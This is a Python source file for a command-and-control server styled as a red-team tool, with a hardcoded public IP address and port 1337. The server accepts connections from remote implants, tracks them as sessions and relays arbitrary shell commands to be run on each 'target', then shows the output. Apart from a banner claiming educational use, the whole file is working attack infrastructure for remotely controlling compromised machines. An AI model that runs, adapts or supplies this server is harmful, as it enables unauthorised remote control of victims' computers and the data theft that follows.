import socket
import threading
import json
import time
import chardet
import os
import sys
import readline
from datetime import datetime
import platform

# C2 Server Configuration
HOST = "88.198.163.195"
PORT = 1337
clients = {}
client_sockets = {}
client_id_counter = 1
COMMAND_TIMEOUT = 90
SOCKET_TIMEOUT = 90
BUFFER_SIZE = 16384
KEEP_ALIVE_INTERVAL = 10
debug_mode = False

# ANSI color codes
class Colors:
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_BLACK = '\033[90m'
    WHITE = '\033[37m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Command history and autocompletion setup
COMMANDS = [
    "who", "select", "refresh", "clear", "debug", "help", "exit",
    "ls", "dir", "cd", "pwd", "hostname", "whoami", "ipconfig",
    "ifconfig", "netstat", "ps", "tasklist", "back", "sessions",
    "interact", "kill", "background"
]

class CommandCompleter:
    def __init__(self, options):
        self.options = sorted(options)
    
    def complete(self, text, state):
        response = None
        if state == 0:
            if text:
                self.matches = [s for s in self.options if s.startswith(text)]
            else:
                self.matches = self.options[:]
        
        try:
            response = self.matches[state]
        except IndexError:
            response = None
        
        return response

# Setup readline for command history and autocompletion
readline.set_completer(CommandCompleter(COMMANDS).complete)
readline.parse_and_bind('tab: complete')
readline.set_history_length(1000)

# Enable ANSI colors on Windows
if platform.system() == 'Windows':
    os.system('color')

# Banner
def show_banner():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print(f"""{Colors.BRIGHT_CYAN}╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║ {Colors.BRIGHT_WHITE}████████╗██╗  ██╗███████╗    ██╗    ██╗██╗  ██╗██╗████████╗███████╗    ██╗  ██╗ █████╗ ████████╗{Colors.BRIGHT_CYAN} ║
║ {Colors.BRIGHT_WHITE}╚══██╔══╝██║  ██║██╔════╝    ██║    ██║██║  ██║██║╚══██╔══╝██╔════╝    ██║  ██║██╔══██╗╚══██╔══╝{Colors.BRIGHT_CYAN} ║
║ {Colors.BRIGHT_WHITE}   ██║   ███████║█████╗      ██║ █╗ ██║███████║██║   ██║   █████╗      ███████║███████║   ██║{Colors.BRIGHT_CYAN}    ║
║ {Colors.BRIGHT_WHITE}   ██║   ██╔══██║██╔══╝      ██║███╗██║██╔══██║██║   ██║   ██╔══╝      ██╔══██║██╔══██║   ██║{Colors.BRIGHT_CYAN}    ║
║ {Colors.BRIGHT_WHITE}   ██║   ██║  ██║███████╗    ╚███╔███╔╝██║  ██║██║   ██║   ███████╗    ██║  ██║██║  ██║   ██║{Colors.BRIGHT_CYAN}    ║
║ {Colors.BRIGHT_WHITE}   ╚═╝   ╚═╝  ╚═╝╚══════╝     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝{Colors.BRIGHT_CYAN}    ║
║                                                                                       ║
║                   {Colors.BRIGHT_MAGENTA}╔═══════════════════════════════════════════╗{Colors.BRIGHT_CYAN}                    ║
║                   {Colors.BRIGHT_MAGENTA}║      C2 SERVER - RED TEAM OPERATOR      ║{Colors.BRIGHT_CYAN}                    ║
║                   {Colors.BRIGHT_MAGENTA}╚═══════════════════════════════════════════╝{Colors.BRIGHT_CYAN}                    ║
║                                                                                       ║
║  {Colors.BRIGHT_GREEN}[+] Version:{Colors.WHITE} 2.0 Enhanced Edition                                                    {Colors.BRIGHT_CYAN}║
║  {Colors.BRIGHT_GREEN}[+] Author:{Colors.WHITE} The-White-Hat                                                            {Colors.BRIGHT_CYAN}║
║  {Colors.BRIGHT_GREEN}[+] Purpose:{Colors.WHITE} Educational & Authorized Testing Only                                   {Colors.BRIGHT_CYAN}║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.BRIGHT_YELLOW}{'═' * 91}{Colors.RESET}
""")

# Format JSON data into a readable string
def format_json_to_string(data, max_items=5):
    if not isinstance(data, dict):
        return str(data)
    
    # Build a formatted string representation
    result = []
    items = list(data.items())
    
    # Find the longest key for alignment
    max_key_length = max(len(str(key)) for key, _ in items[:max_items]) if items else 0
    
    for i, (key, value) in enumerate(items[:max_items]):
        # Format each key-value pair
        key_str = f"{Colors.BRIGHT_MAGENTA}{str(key):<{max_key_length}}{Colors.RESET}"
        
        # Handle multiline values
        value_str = str(value)
        if '\n' in value_str:
            # Indent multiline values
            lines = value_str.split('\n')
            value_str = lines[0] + '\n' + '\n'.join('  ' + line for line in lines[1:])
        
        result.append(f"  {key_str} : {Colors.WHITE}{value_str}{Colors.RESET}")
    
    if len(items) > max_items:
        result.append(f"  {Colors.BRIGHT_BLACK}... ({len(items) - max_items} more items){Colors.RESET}")
    
    return '\n'.join(result)

# Client status table
def get_client_table():
    print(f"""
{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════════════════╗
║                         ACTIVE SESSIONS                               ║
╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
    
    if not clients:
        print(f"{Colors.BRIGHT_YELLOW}  [!] No active sessions{Colors.RESET}\n")
        return
    
    # Create a mapping of display index to actual client ID
    client_list = list(clients.items())
    
    for idx, (client_id, client_info) in enumerate(client_list, 1):
        address = f"{client_info['address'][0]}:{client_info['address'][1]}"
        last_data = client_info.get('last_data', {})
        last_seen = client_info.get('last_seen', time.time())
        last_seen_str = time.strftime("%H:%M:%S", time.localtime(last_seen))
        
        time_diff = time.time() - last_seen
        if time_diff < 30:
            status = f"{Colors.BRIGHT_GREEN}● ONLINE{Colors.RESET}"
        elif time_diff < 60:
            status = f"{Colors.BRIGHT_YELLOW}◐ IDLE{Colors.RESET}"
        else:
            status = f"{Colors.BRIGHT_RED}○ TIMEOUT{Colors.RESET}"
        
        print(f"  {Colors.BRIGHT_WHITE}{idx:02d}{Colors.RESET}. {status} [{Colors.BRIGHT_CYAN}ID:{client_id}{Colors.RESET}] "
              f"{Colors.WHITE}Unknown{Colors.RESET} "
              f"({Colors.BRIGHT_YELLOW}Unknown OS{Colors.RESET}) "
              f"- {Colors.BRIGHT_MAGENTA}{address}{Colors.RESET} "
              f"- {Colors.BRIGHT_BLACK}Last: {last_seen_str}{Colors.RESET}")
    print()

# Get client ID from index
def get_client_id_from_index(index):
    """Convert display index (1, 2, 3...) to actual client ID"""
    client_list = list(clients.keys())
    if 1 <= index <= len(client_list):
        return client_list[index - 1]
    return None

# Handle individual client connection
def handle_client(client_socket, client_address, client_id):
    print(f"""
{Colors.BRIGHT_GREEN}[+] NEW CONNECTION ESTABLISHED{Colors.RESET}
{Colors.BRIGHT_CYAN}┌─[{Colors.WHITE}Session{Colors.BRIGHT_CYAN}]: {Colors.BRIGHT_WHITE}ID:{client_id}{Colors.RESET}
{Colors.BRIGHT_CYAN}├─[{Colors.WHITE}From{Colors.BRIGHT_CYAN}]: {Colors.BRIGHT_YELLOW}{client_address[0]}:{client_address[1]}{Colors.RESET}
{Colors.BRIGHT_CYAN}└─[{Colors.WHITE}Time{Colors.BRIGHT_CYAN}]: {Colors.BRIGHT_MAGENTA}{datetime.now().strftime('%H:%M:%S')}{Colors.RESET}
""")
    
    try:
        client_socket.settimeout(SOCKET_TIMEOUT)
        client_sockets[client_id] = client_socket
        
        def send_keep_alive():
            while client_id in client_sockets:
                try:
                    client_socket.send(b"PING\n")
                    if debug_mode:
                        console.print(f"[DEBUG] Sent PING to Client {client_id}", style="dim")
                    time.sleep(KEEP_ALIVE_INTERVAL)
                except:
                    break
        
        keep_alive_thread = threading.Thread(target=send_keep_alive)
        keep_alive_thread.daemon = True
        keep_alive_thread.start()
        
        buffer = b""
        while True:
            try:
                data = client_socket.recv(BUFFER_SIZE)
                if not data:
                    break
                
                if data == b"PING\n":
                    clients[client_id]["last_seen"] = time.time()
                    continue
                
                buffer += data
                if b"END_OF_MESSAGE\n" in buffer:
                    message, _, buffer = buffer.partition(b"END_OF_MESSAGE\n")
                    detected = chardet.detect(message)
                    encoding = detected['encoding'] if detected['encoding'] else 'utf-8'
                    try:
                        decoded_data = message.decode(encoding, errors='replace')
                    except UnicodeDecodeError:
                        decoded_data = message.decode('cp1252', errors='replace')
                    
                    try:
                        parsed_data = json.loads(decoded_data) if decoded_data.startswith("{") else {"info": decoded_data}
                    except json.JSONDecodeError:
                        parsed_data = {"info": decoded_data, "error": "Invalid JSON, treated as raw data"}
                    
                    # Display response
                    if isinstance(parsed_data, dict) and 'result' in parsed_data and parsed_data.get('status') == 'success':
                        print(f"\n{Colors.WHITE}{parsed_data['result']}{Colors.RESET}\n")
                    elif isinstance(parsed_data, dict) and 'info' in parsed_data:
                        print(f"\n{Colors.WHITE}{parsed_data['info']}{Colors.RESET}\n")
                    else:
                        # Format and print the data
                        formatted_data = format_json_to_string(parsed_data)
                        if formatted_data:
                            print(f"\n{formatted_data}\n")
                    
                    clients[client_id]["last_data"] = parsed_data
                    clients[client_id]["last_seen"] = time.time()
                
            except socket.timeout:
                print(f"\n{Colors.BRIGHT_YELLOW}[-] Session timed out: {Colors.BRIGHT_WHITE}ID:{client_id}{Colors.RESET}")
                break
            except Exception as e:
                if debug_mode:
                    print(f"\n{Colors.BRIGHT_RED}[-] Session error: {Colors.BRIGHT_WHITE}ID:{client_id} - {str(e)}{Colors.RESET}")
                clients[client_id]["last_data"] = {"error": f"Client error: {str(e)}"}
                break
                
    except Exception as e:
        print(f"\n{Colors.BRIGHT_RED}[-] Fatal error: {Colors.BRIGHT_WHITE}ID:{client_id} - {str(e)}{Colors.RESET}")
    finally:
        print(f"\n{Colors.BRIGHT_YELLOW}[-] SESSION TERMINATED: {Colors.BRIGHT_WHITE}ID:{client_id}{Colors.RESET}")
        client_socket.close()
        if client_id in clients:
            del clients[client_id]
        if client_id in client_sockets:
            del client_sockets[client_id]

# Send command to a specific client
def send_command(client_id, command):
    if client_id not in client_sockets:
        print(f"{Colors.BRIGHT_RED}[!] Session not found{Colors.RESET}")
        return False
    
    client_socket = client_sockets[client_id]
    try:
        client_socket.send((command + "\n").encode('utf-8', errors='replace'))
        print(f"{Colors.BRIGHT_BLACK}[*] Executing command...{Colors.RESET}")
        return True
    except UnicodeEncodeError:
        client_socket.send((command + "\n").encode('cp1252', errors='replace'))
        print(f"{Colors.BRIGHT_BLACK}[*] Executing command...{Colors.RESET}")
        return True
    except Exception as e:
        print(f"{Colors.BRIGHT_RED}[!] Failed to send command: {str(e)}{Colors.RESET}")
        return False

# Reset terminal without clearing or disrupting input
def reset_terminal():
    try:
        sys.stdout.flush()
        sys.stderr.flush()
    except Exception as e:
        if debug_mode:
            print(f"[DEBUG] Terminal reset failed: {str(e)}")

# Clear the terminal screen
def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')
    show_banner()

# Custom input function to debug and ensure stability
def get_input(prompt_text):
    reset_terminal()
    try:
        user_input = input(prompt_text)
        if debug_mode:
            print(f"[DEBUG] Raw input captured: '{user_input}'")
        return user_input.strip()
    except KeyboardInterrupt:
        if debug_mode:
            print("[DEBUG] KeyboardInterrupt detected")
        return "exit"
    except Exception as e:
        if debug_mode:
            print(f"[DEBUG] Input error: {str(e)}")
        return ""

# Help menu
def show_help():
    print(f"""
{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════════════════╗
║                          COMMAND REFERENCE                            ║
╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.BRIGHT_GREEN}[SESSION MANAGEMENT]{Colors.RESET}
  {Colors.BRIGHT_CYAN}sessions{Colors.RESET}              - List all active sessions
  {Colors.BRIGHT_CYAN}interact <index>{Colors.RESET}      - Interact with a session by its index number
  {Colors.BRIGHT_CYAN}background{Colors.RESET}            - Background current session
  {Colors.BRIGHT_CYAN}kill <index>{Colors.RESET}          - Terminate a session by its index number

{Colors.BRIGHT_GREEN}[GENERAL COMMANDS]{Colors.RESET}
  {Colors.BRIGHT_CYAN}help{Colors.RESET}                  - Show this help menu
  {Colors.BRIGHT_CYAN}clear{Colors.RESET}                 - Clear the screen
  {Colors.BRIGHT_CYAN}exit{Colors.RESET}                  - Exit the C2 server

{Colors.BRIGHT_GREEN}[SESSION COMMANDS]{Colors.RESET}
  {Colors.BRIGHT_CYAN}back{Colors.RESET}                  - Return to main menu (same as background)
  {Colors.BRIGHT_CYAN}exit{Colors.RESET}                  - Close the current session

{Colors.BRIGHT_YELLOW}[!] When in session, any other command will be executed on target{Colors.RESET}
""")

# Main server function
def start_server():
    global client_id_counter
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(10)
        
        print(f"{Colors.BRIGHT_CYAN}[*] Starting C2 server...{Colors.RESET}")
        
        # Loading animation
        for i in range(20):
            print(f"\r{Colors.BRIGHT_CYAN}[{'█' * i}{' ' * (19-i)}] {i*5}%{Colors.RESET}", end='')
            time.sleep(0.05)
        print(f"\r{Colors.BRIGHT_GREEN}[████████████████████] 100% - Server initialized!{Colors.RESET}")
        
        print(f"\n{Colors.BRIGHT_GREEN}[+] C2 Server listening on {Colors.BRIGHT_WHITE}{HOST}:{PORT}{Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}[*] Waiting for connections...{Colors.RESET}")
        
        print(f"""
{Colors.BRIGHT_CYAN}┌─[{Colors.BRIGHT_GREEN}SERVER STATUS{Colors.BRIGHT_CYAN}]
├─[{Colors.WHITE}Host{Colors.BRIGHT_CYAN}]: {Colors.BRIGHT_WHITE}{HOST}:{PORT}{Colors.RESET}
├─[{Colors.WHITE}Active Sessions{Colors.BRIGHT_CYAN}]: {Colors.BRIGHT_GREEN}{len(clients)}{Colors.RESET}
└─[{Colors.WHITE}Server Time{Colors.BRIGHT_CYAN}]: {Colors.BRIGHT_MAGENTA}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}
""")
        
        def accept_clients():
            global client_id_counter
            while True:
                try:
                    server.settimeout(SOCKET_TIMEOUT)
                    client_socket, client_address = server.accept()
                    client_id = client_id_counter
                    client_id_counter += 1
                    clients[client_id] = {"address": client_address, "last_data": {}, "last_seen": time.time()}
                    
                    client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address, client_id))
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"{Colors.BRIGHT_RED}[-] Server error: {str(e)}{Colors.RESET}")
                    break
            
        server_thread = threading.Thread(target=accept_clients)
        server_thread.daemon = True
        server_thread.start()
        
        # Interactive command loop
        active_session = None
        while True:
            if active_session and active_session in clients:
                # Session prompt
                client = clients.get(active_session, {})
                prompt = (f"{Colors.BRIGHT_MAGENTA}┌─[{Colors.BRIGHT_GREEN}session"
                         f"{Colors.BRIGHT_MAGENTA}@{Colors.BRIGHT_CYAN}{client.get('address', ['Unknown'])[0]}"
                         f"{Colors.BRIGHT_MAGENTA}]-[{Colors.BRIGHT_YELLOW}shell{Colors.BRIGHT_MAGENTA}]\n"
                         f"└─➤{Colors.RESET} ")
            else:
                # Main prompt
                active_session = None
                prompt = (f"{Colors.BRIGHT_MAGENTA}┌─[{Colors.BRIGHT_WHITE}TheWhiteHat"
                         f"{Colors.BRIGHT_MAGENTA}@{Colors.BRIGHT_CYAN}C2-Server{Colors.BRIGHT_MAGENTA}]\n"
                         f"└─➤{Colors.RESET} ")
            
            # Get command and process it differently for main menu vs session
            raw_command = get_input(prompt)
            
            # Main menu commands (case insensitive)
            if not active_session:
                command = raw_command.lower()
                
                if command == "exit":
                    print(f"\n{Colors.BRIGHT_YELLOW}[!] Shutting down C2 server...{Colors.RESET}")
                    break
                
                elif command == "sessions":
                    get_client_table()
                
                elif command == "clear":
                    clear_terminal()
                    print(f"""
{Colors.BRIGHT_CYAN}┌─[{Colors.BRIGHT_GREEN}SERVER STATUS{Colors.BRIGHT_CYAN}]
├─[{Colors.WHITE}Host{Colors.BRIGHT_CYAN}]: {Colors.BRIGHT_WHITE}{HOST}:{PORT}{Colors.RESET}
├─[{Colors.WHITE}Active Sessions{Colors.BRIGHT_CYAN}]: {Colors.BRIGHT_GREEN}{len(clients)}{Colors.RESET}
└─[{Colors.WHITE}Server Time{Colors.BRIGHT_CYAN}]: {Colors.BRIGHT_MAGENTA}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}
""")
                
                elif command == "help":
                    show_help()
                
                elif command.startswith("interact "):
                    try:
                        index = int(command.split()[1])
                        client_id = get_client_id_from_index(index)
                        if client_id and client_id in clients:
                            active_session = client_id
                            print(f"{Colors.BRIGHT_GREEN}[+] Interacting with session: {Colors.BRIGHT_WHITE}Index:{index} (ID:{client_id}){Colors.RESET}")
                        else:
                            print(f"{Colors.BRIGHT_RED}[!] Session not found. Use 'sessions' to see available sessions.{Colors.RESET}")
                    except (IndexError, ValueError):
                        print(f"{Colors.BRIGHT_RED}[!] Usage: interact <index>{Colors.RESET}")
                
                elif command.startswith("kill "):
                    try:
                        index = int(command.split()[1])
                        client_id = get_client_id_from_index(index)
                        if client_id and client_id in client_sockets:
                            send_command(client_id, "exit")
                            print(f"{Colors.BRIGHT_GREEN}[+] Session terminated: {Colors.BRIGHT_WHITE}Index:{index} (ID:{client_id}){Colors.RESET}")
                        else:
                            print(f"{Colors.BRIGHT_RED}[!] Session not found. Use 'sessions' to see available sessions.{Colors.RESET}")
                    except (IndexError, ValueError):
                        print(f"{Colors.BRIGHT_RED}[!] Usage: kill <index>{Colors.RESET}")
                
                elif command and command != "":
                    print(f"{Colors.BRIGHT_YELLOW}[!] Unknown command. Type 'help' for available commands{Colors.RESET}")
            
            # Session commands (case sensitive for shell commands)
            else:
                command = raw_command
                
                if command.lower() in ["back", "background"]:
                    print(f"{Colors.BRIGHT_CYAN}[*] Backgrounding session...{Colors.RESET}")
                    active_session = None
                elif command.lower() == "exit":
                    # Send exit command to client and background the session
                    send_command(active_session, "exit")
                    print(f"{Colors.BRIGHT_CYAN}[*] Closing session and returning to main menu...{Colors.RESET}")
                    active_session = None
                elif command.lower() == "clear":
                    # Clear terminal while in session
                    clear_terminal()
                    print(f"{Colors.BRIGHT_GREEN}[*] Session active: {Colors.BRIGHT_WHITE}ID:{active_session}{Colors.RESET}")
                    client = clients.get(active_session, {})
                    address = client.get('address', ['Unknown', 'Unknown'])
                    print(f"{Colors.BRIGHT_CYAN}[*] Connected to: {Colors.BRIGHT_YELLOW}{address[0]}:{address[1]}{Colors.RESET}\n")
                elif command:
                    send_command(active_session, command)
                
    except Exception as e:
        print(f"\n{Colors.BRIGHT_RED}[-] Fatal error: {str(e)}{Colors.RESET}")
    finally:
        server.close()
        print(f"\n{Colors.BRIGHT_GREEN}[+] Server shutdown complete{Colors.RESET}")

# Initialize and run the server
if __name__ == "__main__":
    clear_terminal()
    start_server()
